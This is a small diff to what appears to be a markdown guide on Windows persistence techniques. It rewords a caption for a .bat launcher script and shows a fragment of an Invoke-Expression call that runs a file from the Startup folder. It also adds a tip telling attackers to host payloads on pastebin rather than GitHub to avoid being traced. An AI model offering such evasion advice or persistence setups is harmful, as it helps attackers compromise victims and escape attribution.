@@ -101,7 +101,7 @@ while (1){
 } 
 ```
 
-.bat script to run the powershell script
+The following is the .bat script to run the powershell script
 
 Save the following script as per.bat
 
@@ -122,6 +122,7 @@ Invoke-Expression -Command "& '$env:APPDATA\Microsoft\Windows\Start Menu\Program
 
 ```
 
+Note: as an attacker, you should not be hosting payloads on your github because it will lead to you. You can host the payloads as text on pastebin and modify the code accordingly.
 
 
 ## Zipping files and directories
